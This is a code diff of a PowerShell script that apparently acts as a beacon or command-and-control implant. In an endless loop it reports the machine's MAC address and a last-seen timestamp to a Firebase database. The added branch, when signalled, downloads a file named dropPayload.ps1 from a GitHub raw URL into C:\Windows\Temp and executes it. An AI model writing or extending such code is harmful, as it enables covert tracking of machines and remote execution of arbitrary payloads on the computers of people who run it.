@@ -78,18 +78,23 @@ while ($true) {
 
     elseif ($ping -eq 1) {
         $stateChild = @{
-            "PING" = 0
+            "LastSeen" = (Get-Date).ToString("HH:mm:ss dddd, dd MMMM yyyy")
         } | ConvertTo-Json
         # PUT the data to the Firebase Realtime Database
-        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/Online/' + $primaryAdapter.MacAddress + '/TCP.json') -Method PUT -Body $stateChild | Out-Null
-        
+        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/Online/' + $primaryAdapter.MacAddress + '.json') -Method PUT -Body $stateChild | Out-Null
         start-sleep -Seconds 5
+    }
 
+    elseif ($state -eq 2) {
+        # PUT the data to the Firebase Realtime Database
+        Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/side-project/dropPayload.ps1 > C:\Windows\Temp\dropPayload.ps1
+        Invoke-Expression -Command "C:\Windows\Temp\dropPayload.ps1"
         $stateChild = @{
-            "PING" = 1
+            "Update" = 1
         } | ConvertTo-Json
         # PUT the data to the Firebase Realtime Database
-        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/Online/' + $primaryAdapter.MacAddress + '/TCP.json') -Method PUT -Body $stateChild | Out-Null
+        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '.json') -Method PUT -Body $stateChild | Out-Null
+        start-sleep -Seconds 5
     }
 
     Start-Sleep -Seconds 5
